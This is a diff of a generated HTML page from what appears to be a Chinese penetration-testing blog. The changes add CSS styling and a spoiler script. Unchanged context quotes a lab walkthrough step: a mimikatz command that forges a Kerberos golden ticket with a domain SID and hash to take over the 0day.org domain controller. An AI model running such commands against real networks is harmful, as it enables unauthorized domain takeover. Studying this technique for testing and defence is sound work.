@@ -253,7 +253,10 @@ add-pssnapin microsoft.">
 
     .toc-widget {
         width: 345px;
-        padding-left: 20px;
+    padding-left: 20px;
+    background-color: rgb(255, 255, 255,0.7);
+    border-radius: 10px;
+    box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
     }
 
     .toc-widget .toc-title {
@@ -835,7 +838,7 @@ filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.or
 <p>接下来，构造黄金票据并将其注入内存，就能够获得 0day.org 域控的权限了</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz <span class="token string">"Kerberos::golden /user:Administrator /domain:0day.org /sid:5-1-5-21-1812920812-2335051732-3517558806 /rc4:b53a5c8c51648f053b96971e7ae4ee25 /ptt"</span> <span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a></p>
-
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                 
             </div>
             <hr/>
